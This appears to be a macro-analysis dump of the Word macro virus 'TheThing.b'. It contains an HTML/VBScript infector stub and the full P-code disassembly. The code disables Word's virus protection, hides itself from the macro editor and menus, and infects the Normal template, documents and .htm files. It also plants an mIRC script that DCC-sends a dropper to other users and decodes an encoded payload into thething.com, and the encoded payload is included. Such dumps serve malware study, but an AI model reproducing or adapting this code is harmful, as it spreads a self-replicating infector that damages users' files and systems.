'!#"'!#.$!#"%%%/#-'*'/'&'$()#*'-#!#"$*#.!
'+!(#!#!#*%''!#-%&'/')#"'*#!#/$!#-%&'/')#
'$')'&'$','*'%(*#!#%&)'&'/'.!+!(#!#!#!#'%
'0'#(!#+'!#.$!#"$!#%&0'!#-%&'/')#"'*#!#.#
'!#-%&'/')#$')'&'$','*'%(*#.!+!(#!#!#!#!#
'*%''!#.%*'%'%#)#"'-#!#+'-#!#-%&'/')#$')'
'&'$','*'%(*#!#,#!#"$*#!#.$!#$')'&'$','*'
'%(!#,#!###('##!#%&)'&'/'!#(%&'%(%%&(.'!(
'!#.$!#*'!#,#!#"$+$!#*'!#.$!#"%%%/#$'0'&(
'/'%(0'''-'*'/'&'$(.!+!(#!#!#!#/%&')(%(.!
'+!(#!#!#&%/'%'!#*%''.!+!(#!#!#*'!#.$!#*'
'!#,#!#"$.!+!(#!#-%0'0'!(.!+!(#!#%'#(0'!(
'!(&'#(#%0'%'*(!#.$!#####.!+!(#!#%%0'!#(&
')'*'-'&'!#.%*'%'%#)#"%%%/#-'*'/'&'$()#(%
'&'%(%%&(.'!(-#!#"$*#-#!#"$-#!#"$*#!#.$!#
'##(###.!+!(#!#!#*%''!#-%&'/')#"%%%/#-'*'
'/'&'$()#(%&'%(%%&(.'!(-#!#"$*#*#!#/$!##$
'!#%&)'&'/'.!+!(#!#!#!#'%0'#(!#*'!#.$!##$
'!#%&0'!#-%&'/')#"%%%/#-'*'/'&'$()#(%&'%(
'%%&(.'!(-#!#"$*#*#!#$&%(&'!(!##$.!+!(#!#
'!#!#!#*%''!#.%*'%'%#)#"%%%/#-'*'/'&'$()#
'(%&'%(%%&(.'!(-#!#"$*#-#!#*'-#!#"$*#!#-$
'/$!###!###!#%&)'&'/'.!+!(#!#!#!#!#!#"'"$
'!#.$!#"%$($')#.%*'%'%#)#"%%%/#-'*'/'&'$(
')#(%&'%(%%&(.'!(-#!#"$*#-#!#*'-#!#"$*#*#
'!#.#!#$$$$.!+!(#!#!#!#!#!##'"$!#.$!#"%$(
'$')#.%*'%'%#)#"%%%/#-'*'/'&'$()#(%&'%(%%
'&(.'!(-#!#"$*#-#!#*'!#,#!#"$-#!#"$*#*#!#
'.#!#$$$$.!+!(#!#!#!#!#!#%'#(0'!(!(&'#(#%
'0'%'*(!#.$!#%'#(0'!(!(&'#(#%0'%'*(!#,#!#
'$%)'#(%#)#"'"$!#,#!#"$'$!#+#!##'"$*#.!+!
'(#!#!#!#!#&%/'%'!#*%''.!+!(#!#!#!#/%&')(
'%(.!+!(#!#!#&%/'%'!#*%''.!+!(#!#!#(%&'%(
'%%&(.'!(!#.$!#(%&'%(%%&(.'!(!#,#!#"$.!+!
'(#!#-%0'0'!(.!+!(#!#0%!(&'/'!#%'#(0'!(!(
'&'#(!&"'%()'!#,#!###%()'&'%()'*'/'('/#$'
'0'.'##!#'%0'#(!#0%&(%(!(&(%(!#"%$(!#$#"$
'.!+!(#!#!#!&#(*'/'%(!#$#"$-#!#%'#(0'!(!(
'&'#(#%0'%'*(,$.!+!(#!#$%-'0'$(&'!#$#"$.!
'+!(#&%/'%'!#$&&(#'.!+!(#!&#(*''("'%(&'!#
'$&&(#'!#%%&(.'!(*'/'(')#*#.!+!(#.!+!(#&%
'/'%'!#$&&(#'.!+!.#.#/$-$0#$($'#(*'!(%(/$
'.!+!-$0##%0%%%*&/$.!+!-$0#)%%&.%-%/$.!+!
' '
End Sub
--></script>
</BODY>
</HTML>
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.TheThing.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 46203 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "<html> <CyberShadow>"
' Line #1:
' 	QuoteRem 0x0000 0x0006 "<BODY>"
' Line #2:
' 	QuoteRem 0x0000 0x0020 "<script language="VBScript"><!--"
' Line #3:
' 	QuoteRem 0x0000 0x001B "Private Sub Window_Onload()"
' Line #4:
' 	QuoteRem 0x0000 0x0015 " On Error Resume Next"
' Line #5:
' 	QuoteRem 0x0000 0x0024 " If Location.protocol = "file:" Then"
' Line #6:
' 	QuoteRem 0x0000 0x0009 "  Dim FSO"
' Line #7:
' 	QuoteRem 0x0000 0x0036 "  Set FSO = CreateObject("Scripting.FileSystemObject")"
' Line #8:
' 	QuoteRem 0x0000 0x0033 "  HostPath = Replace(Location.href, "file:///", "")"
' Line #9:
' 	QuoteRem 0x0000 0x0028 "  HostPath = Replace(HostPath, "/", "\")"
' Line #10:
' 	QuoteRem 0x0000 0x003B "  Set WordObj = GetObject("", "Word.Application"): Quit = 0"
' Line #11:
' 	QuoteRem 0x0000 0x004F "  If WordObj = "" Then Set WordObj = CreateObject("Word.Application"): Quit = 1"
' Line #12:
' 	QuoteRem 0x0000 0x0044 "  Set NT = WordObj.Templates(1).VBProject.VBComponents(1).Codemodule"
' Line #13:
' 	QuoteRem 0x0000 0x0033 "  If NT.Lines(1, 1) <> "'<html> <CyberShadow>" Then"
' Line #14:
' 	QuoteRem 0x0000 0x002B "   WordObj.Options.SaveNormalPrompt = False"
' Line #15:
' 	QuoteRem 0x0000 0x0024 "   NT.DeleteLines 1, NT.CountOfLines"
' Line #16:
' 	QuoteRem 0x0000 0x001A "   NT.AddFromFile HostPath"
' Line #17:
' 	QuoteRem 0x0000 0x0017 "'NT.NormalTemplate.Save"
' Line #18:
' 	QuoteRem 0x0000 0x0012 "   For j = 1 To 29"
' Line #19:
' 	QuoteRem 0x0000 0x002A "    NT.ReplaceLine j, "'" + NT.Lines(j, 1)"
' Line #20:
' 	QuoteRem 0x0000 0x0007 "   Next"
' Line #21:
' 	QuoteRem 0x0000 0x0024 "   For j = 30 To NT.CountOfLines - 3"
' Line #22:
' 	QuoteRem 0x0000 0x0041 "    NT.ReplaceLine j, Mid(NT.Lines(j, 1), 2, Len(NT.Lines(j, 1)))"
' Line #23:
' 	QuoteRem 0x0000 0x0007 "   Next"
' Line #24:
' 	QuoteRem 0x0000 0x0008 "  End If"
' Line #25:
' 	QuoteRem 0x0000 0x0012 "  Set NT = Nothing"
' Line #26:
' 	QuoteRem 0x0000 0x001F "  If Quit = 1 Then WordObj.Quit"
' Line #27:
' 	QuoteRem 0x0000 0x0007 " End If"
' Line #28:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #29:
' 	FuncDefn (Private Sub Document_Close())
' Line #30:
' 	OnError (Resume Next) 
' Line #31:
' 	QuoteRem 0x0001 0x0008 "TheThing"
' Line #32:
' 	QuoteRem 0x0001 0x0013 "by CyberShadow//SMF"
' Line #33:
' 	ArgsCall (Call) DisableAll 0x0000 
' Line #34:
' 	ArgsCall (Call) infectDoc 0x0000 
' Line #35:
' 	ArgsCall (Call) infectMIRC 0x0000 
' Line #36:
' 	LitStr 0x0003 "c:\"
' 	ArgsCall (Call) WriteDump 0x0001 
' 	BoS 0x0000 
' 	QuoteRem 0x0018 0x0021 " rv = Shell("c:\thething.com", 6)"
' Line #37:
' 	LitStr 0x000F "c:\thething.com"
' 	ArgsCall Kill 0x0001 
' Line #38:
' 	ArgsCall (Call) infectHTMS 0x0000 
' Line #39:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #40:
' 	EndSub 
' Line #41:
' 	FuncDefn (Private Sub infectHTMS())
' Line #42:
' 	OnError (Resume Next) 
' Line #43:
' 	LitStr 0x0000 ""
' 	LitStr 0x0052 "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
' 	LitStr 0x0008 "Personal"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St a 
' Line #44:
' 	Ld a 
' 	ArgsCall (Call) SearchForHTM 0x0001 
' Line #45:
' 	LitStr 0x0004 "PATH"
' 	ArgsLd Environ 0x0001 
' 	St a 
' Line #46:
' 	LitDI2 0x0001 
' 	St i 
' Line #47:
' 	Ld i 
' 	Ld a 
' 	FnLen 
' 	Le 
' 	DoWhile 
' Line #48:
' 	LitStr 0x0000 ""
' 	St c 
' Line #49:
' 	Ld i 
' 	Ld a 
' 	FnLen 
' 	Le 
' 	Ld a 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0001 ";"
' 	Ne 
' 	And 
' 	DoWhile 
' Line #50:
' 	Ld c 
' 	Ld a 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Add 
' 	St c 
' Line #51:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #52:
' 	Loop 
' Line #53:
' 	Ld c 
' 	ArgsCall (Call) SearchForHTM 0x0001 
' Line #54:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #55:
' 	Loop 
' Line #56:
' 	EndSub 
' Line #57:
' 	FuncDefn (Private Sub ViewVBCode())
' 	BoS 0x0000 
' 	ArgsCall Stealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #58:
' 	FuncDefn (Private Sub ToolsMacro())
' 	BoS 0x0000 
' 	ArgsCall Stealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #59:
' 	FuncDefn (Private Sub FileTemplates())
' 	BoS 0x0000 
' 	ArgsCall Stealth 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #60:
' 	FuncDefn (Private Sub Stealth())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' Line #61:
' 	LitDI2 0x0000 
' 	St ShowVisualBasicEditor 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #62:
' 	EndSub 
' Line #63:
' 	FuncDefn (Private Sub SearchForHTM(PathForHTM))
' Line #64:
' 	OnError (Resume Next) 
' Line #65:
' 	Ld PathForHTM 
' 	LitStr 0x0007 "\*.htm*"
' 	Add 
' 	ArgsLd Dir$ 0x0001 
' 	St Target 
' Line #66:
' 	Ld Target 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NoHTMs 
' 	EndIf 
' Line #67:
' 	Do 
' Line #68:
' 	Ld PathForHTM 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld Target 
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #69:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #70:
' 	Ld a 
' 	LitStr 0x0014 "<html> <CyberShadow>"
' 	Ne 
' 	IfBlock 
' Line #71:
' 	Ld a 
' 	St c 
' Line #72:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld a 
' 	InputItem 
' 	InputDone 
' Line #74:
' 	Ld c 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld a 
' 	Add 
' 	St c 
' Line #75:
' 	Loop 
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #77:
' 	Ld PathForHTM 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld Target 
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #78:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #79:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd countoflines 
' 	For 
' Line #80:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	St ca 
' Line #81:
' 	Ld i 
' 	LitDI2 0x001E 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld ca 
' 	LitDI2 0x0002 
' 	Ld ca 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$$ 0x0003 
' 	St ca 
' 	EndIf 
' Line #82:
' 	Ld i 
' 	LitDI2 0x001E 
' 	Ge 
' 	Ld i 
' 	Ld AD 
' 	MemLd countoflines 
' 	LitDI2 0x0002 
' 	Sub 
' 	Lt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "'"
' 	Ld ca 
' 	Add 
' 	St ca 
' 	EndIf 
' Line #83:
' 	Ld ca 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld ca 
' 	PrintItemNL 
' 	EndIf 
' Line #84:
' 	StartForVariable 
' 	Next 
' Line #85:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld c 
' 	PrintItemNL 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #88:
' 	Ld Dir$ 
' 	St Target 
' Line #89:
' 	Ld Target 
' 	LitStr 0x0000 ""
' 	Ne 
' 	LoopWhile 
' Line #90:
' 	Label NoHTMs 
' Line #91:
' 	EndSub 
' Line #92:
' 	FuncDefn (Private Sub infectMIRC())
' Line #93:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0005 
' 	For 
' Line #94:
' 	LitStr 0x0001 "C"
' 	ArgsLd Asc 0x0001 
' 	Ld i 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	St a 
' Line #95:
' 	Ld a 
' 	ArgsCall (Call) infect 0x0001 
' Line #96:
' 	StartForVariable 
' 	Next 
' Line #97:
' 	EndSub 
' Line #98:
' 	FuncDefn (Private Sub infect(a))
' Line #99:
' 	OnError outta 
' Line #100:
' 	Ld a 
' 	LitStr 0x0007 ":\mirc\"
' 	Add 
' 	St a1 
' Line #101:
' 	Ld a1 
' 	LitStr 0x000A "script.ini"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #102:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "[script]"
' 	PrintItemNL 
' Line #103:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "n0=on 1:JOIN:#:/dcc send $nick "
' 	Ld a1 
' 	Add 
' 	LitStr 0x000C "thething.com"
' 	Add 
' 	PrintItemNL 
' Line #104:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #105:
' 	Ld a1 
' 	St dropperPath 
' Line #106:
' 	Ld dropperPath 
' 	ArgsCall (Call) WriteDump 0x0001 
' Line #107:
' 	Label outta 
' Line #108:
' 	EndSub 
' Line #109:
' 	FuncDefn (Private Sub DisableAll())
' Line #110:
' 	OnError (Resume Next) 
' Line #111:
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld NormalTemplate 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #112:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #113:
' 	LitVarSpecial (True)
' 	MemStWith EnableCancelKey 
' Line #114:
' 	LitVarSpecial (False)
' 	MemStWith ScreenUpdating 
' Line #115:
' 	LitVarSpecial (False)
' 	MemStWith ShowVisualBasicEditor 
' Line #116:
' 	EndWith 
' Line #117:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #118:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #119:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #120:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #121:
' 	EndWith 
' Line #122:
' 	EndSub 
' Line #123:
' 	FuncDefn (Private Sub infectDoc())
' Line #124:
' 	OnError (Resume Next) 
' Line #125:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #126:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #127:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0015 "'<html> <CyberShadow>"
' 	Ne 
' 	IfBlock 
' Line #128:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd countoflines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #129:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd countoflines 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	Ld NT 
' 	ArgsMemCall Insertlines 0x0002 
' Line #130:
' 	EndIfBlock 
' Line #131:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0015 "'<html> <CyberShadow>"
' 	Ne 
' 	IfBlock 
' Line #132:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd countoflines 
' 	Ld AD 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #133:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd countoflines 
' 	Ld NT 
' 	ArgsMemLd lines 0x0002 
' 	Ld AD 
' 	ArgsMemCall Insertlines 0x0002 
' Line #134:
' 	EndIfBlock 
' Line #135:
' 	LitDI2 0x0001 
' 	St i 
' 	BoS 0x0000 
' 	Ld AD 
' 	MemLd countofline 
' 	St c 
' Line #136:
' 	Ld i 
' 	Ld c 
' 	Le 
' 	DoWhile 
' Line #137:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0006 "</HTML"
' 	LitStr 0x0001 ">"
' 	Add 
' 	Eq 
' 	IfBlock 
' Line #138:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld AD 
' 	MemLd countoflines 
' 	Ld i 
' 	Sub 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld AD 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #139:
' 	Ld c 
' 	St i 
' Line #140:
' 	EndIfBlock 
' Line #141:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #142:
' 	Loop 
' Line #143:
' 	LitDI2 0x0001 
' 	St i 
' 	BoS 0x0000 
' 	Ld NT 
' 	MemLd countoflines 
' 	St c 
' Line #144:
' 	Ld i 
' 	Ld c 
' 	Le 
' 	DoWhile 
' Line #145:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0006 "</HTML"
' 	LitStr 0x0001 ">"
' 	Add 
' 	Eq 
' 	IfBlock 
' Line #146:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld NT 
' 	MemLd countoflines 
' 	Ld i 
' 	Sub 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #147:
' 	Ld c 
' 	St i 
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #150:
' 	Loop 
' Line #151:
' 	EndSub 
' Line #152:
' 	FuncDefn (Private Sub WriteDump(dropperPath))
' Line #153:
' 	OnError (Resume Next) 
' Line #154:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #155:
' 	LitStr 0x0006 "Dumpin"
' 	St checkit 
' Line #156:
' 	LitDI2 0x0001 
' 	St i 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St GetDump 
' Line #157:
' 	Ld i 
' 	Ld AD 
' 	MemLd countoflines 
' 	Lt 
' 	DoWhile 
' Line #158:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	St a 
' Line #159:
' 	Ld a 
' 	FnLen 
' 	Ld checkit 
' 	FnLen 
' 	Gt 
' 	IfBlock 
' Line #160:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	FnLen 
' 	Ld checkit 
' 	FnLen 
' 	Sub 
' 	For 
' Line #161:
' 	Ld a 
' 	Ld j 
' 	Ld checkit 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Mid$$ 0x0003 
' 	Ld checkit 
' 	LitStr 0x0001 "g"
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St GetDump 
' 	BoS 0x0000 
' 	Ld AD 
' 	MemLd countoflines 
' 	St i 
' 	EndIf 
' Line #162:
' 	StartForVariable 
' 	Next 
' Line #163:
' 	EndIfBlock 
' Line #164:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #165:
' 	Loop 
' Line #166:
' 	LitStr 0x0000 ""
' 	St dropperBody 
' Line #167:
' 	Ld GetDump 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	DoWhile 
' Line #168:
' 	Ld GetDump 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	FnLen 
' 	LitDI2 0x0002 
' 	Gt 
' 	IfBlock 
' Line #169:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld GetDump 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	FnLen 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #170:
' 	Ld GetDump 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0001 " "
' 	Ne 
' 	IfBlock 
' Line #171:
' 	Ld GetDump 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0021 
' 	Sub 
' 	St a1 
' Line #172:
' 	Ld GetDump 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd lines 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0021 
' 	Sub 
' 	St b1 
' Line #173:
' 	Ld dropperBody 
' 	Ld a1 
' 	LitDI2 0x0010 
' 	Ld b1 
' 	Mul 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St dropperBody 
' Line #174:
' 	EndIfBlock 
' Line #175:
' 	StartForVariable 
' 	Next 
' Line #176:
' 	EndIfBlock 
' Line #177:
' 	Ld GetDump 
' 	LitDI2 0x0001 
' 	Add 
' 	St GetDump 
' Line #178:
' 	Loop 
' Line #179:
' 	Ld dropperPath 
' 	LitStr 0x000C "thething.com"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #180:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld dropperBody 
' 	PrintItemSemi 
' 	PrintEoS 
' Line #181:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #182:
' 	EndSub 
' Line #183:
' 	FuncDefn (Private Sub Dumping())
' Line #184:
' 	QuoteRem 0x0000 0x0028 "/#"+-#!!/)).$$,.+)(!-!!!%(&!!*!*$%,/&0$%"
' Line #185:
' 	QuoteRem 0x0000 0x0028 "+)(!+!!-&(//$)$-$!()+.),!!.$.-"#0!#)&("!"
' Line #186:
' 	QuoteRem 0x0000 0x0028 "$*/!/!(!0"+,!&$-*,!"(#%,0$.-"#$+'%$-%,/$"
' Line #187:
' 	QuoteRem 0x0000 0x0028 ".-"#),$)'"$$,..-0#&),.0!%)#&"!-00,,#$!)/"
' Line #188:
' 	QuoteRem 0x0000 0x0028 "#+"!0!#)(%"!0,+*-")/.)"!(&0,!#$!)/"*"!0&"
' Line #189:
' 	QuoteRem 0x0000 0x0028 "0!#)&$"!#$!-++/#*)/$!*,"''),000#$'!#'',+"
' Line #190:
' 	QuoteRem 0x0000 0x0028 ")//'"!/!0"/,$$$!)/''"!!,.!++0,!#$!)/)'"!"
' Line #191:
' 	QuoteRem 0x0000 0x0028 "0,+*,")/(&"!/!0"/,*%$!)/0%"!")//*%$!$)'-"
' Line #192:
' 	QuoteRem 0x0000 0x0028 "*!!*/#*)'$#*,"+,$%$!$$*-%,-$.-"#0!#)*/!!"
' Line #193:
' 	QuoteRem 0x0000 0x0028 "$*+,%&$!%,!%*,-*#!.-"#/,+*,"0,!'+//#,)/!"
' Line #194:
' 	QuoteRem 0x0000 0x0028 "#*,"(&'&"&-0$0%+*&0&/&(&-+-$-&&()!!*!*++"
' Line #195:
' 	QuoteRem 0x0000 0x0028 "/#00'!#*,"++#/!0+&%,!%/#,)/!#*,".-"#+,!0"
' Line #196:
' 	QuoteRem 0x0000 0x0028 "&!%,!%*,"&!!.-"#+,+*,"%,!%/#,)/!#*,".-"#"
' Line #197:
' 	QuoteRem 0x0000 0x0028 "+,"%'!%,!%*,$!!!.-"#%,/$.-"#/!/!),!!+%,,"
' Line #198:
' 	QuoteRem 0x0000 0x0028 "!!!".-"#(!0"+,+*-",,%*,"/#(-(!!!!!/#"+!*"
' Line #199:
' 	QuoteRem 0x0000 0x0028 ","/#*)(%#!/#-)0%%!+0/#-)'"!*,"/#*)'##*,""
' Line #200:
' 	QuoteRem 0x0000 0x0028 ",0),!!,%.-"#+0/#/)'"!*,"/#,)'##*,",0+,$%"
' Line #201:
' 	QuoteRem 0x0000 0x0028 "$!%,"%.-"#0,!#$!)/&*!!0,+*-"(&)/$)!!/!0""
' Line #202:
' 	QuoteRem 0x0000 0x0028 "/,*%$!)/,(!!+&$$*-%,-$.-"##('#!*!*$*+,%%"
' Line #203:
' 	QuoteRem 0x0000 0x0028 "'!%,!%*,0"&".-"#+,+*-")/("!!"%%,!%.-"#+,"
' Line #204:
' 	QuoteRem 0x0000 0x0028 "$',"*,.#!!%,!%.-"#%,/$.-"#%,-%.-"#$&#&,)"
' Line #205:
' 	QuoteRem 0x0000 0x0028 "+0/,!&$-/#,)/!'%$-$!/-),(#(#,+#$,.-++)!/"
' Line #206:
' 	QuoteRem 0x0000 0x0028 "%#0!%!"#++"-)/-!%!"#++/0$-/0$-!),0)##(-!"
' Line #207:
' 	QuoteRem 0x0000 0x0028 "!*!*#$,.),.!+!,+),(#(#,+,$"0#(*.),!#!#'#"
' Line #208:
' 	QuoteRem 0x0000 0x0028 "*)&!,#+0,)0-+&,&$--++!!-%(&!!*!*++,/'0$-"
' Line #209:
' 	QuoteRem 0x0000 0x0028 ",)0//#/)/"-#!!$$'0,).0$)-$!!%(+"!*!*-+%#"
' Line #210:
' 	QuoteRem 0x0000 0x0028 "0./#+$&!&(0/(%/#!).$!!&(+/-+-$+$&(,0/%/%"
' Line #211:
' 	QuoteRem 0x0000 0x0028 ")0$-*0$-(&*%/%#%0%0%%&%%*%#&!!$%0%.%$&!&"
' Line #212:
' 	QuoteRem 0x0000 0x0028 "&%$%!!-&#&&%(%&%%%*%%&/#&%)&&%!#.#$(!##("
' Line #213:
' 	QuoteRem 0x0000 0x0028 "/##(&'('!!-&*'/'%'&')(/#)'%(.'!!#&&%(%&%"
' Line #214:
' 	QuoteRem 0x0000 0x0028 "%%*%%&%$.!+!.!+!,&)%,%&%*&0&$%&&#&#&&%/%"
' Line #215:
' 	QuoteRem 0x0000 0x0028 "%&0&&&$&&%#&-&$&0'''%((("'#(&'-&.%*'$'#("
' Line #216:
' 	QuoteRem 0x0000 0x0028 "0'$(0'''%(-&0%''''*'$'&'-&)$/#!$-&&%)($'"
' Line #217:
' 	QuoteRem 0x0000 0x0028 "&'-'-&.%*'$'#(0'$(0'''%(!#&%)($'&'-'.&.!"
' Line #218:
' 	QuoteRem 0x0000 0x0028 "+!##0%!(%(*'0'/'$('$##.$####.!+!,&)%,%&%"
' Line #219:
' 	QuoteRem 0x0000 0x0028 "*&0&-%0%$%"%-%0&.%"%$%)%*%/%&%-&$&0'''%("
' Line #220:
' 	QuoteRem 0x0000 0x0028 "(("'#(&'-&.%*'$'#(0'$(0'''%(-&0%''''*'$'"
' Line #221:
' 	QuoteRem 0x0000 0x0028 "&'-&)$/#!$-&&%)($'&'-'-&.%*'$'#(0'$(0'''"
' Line #222:
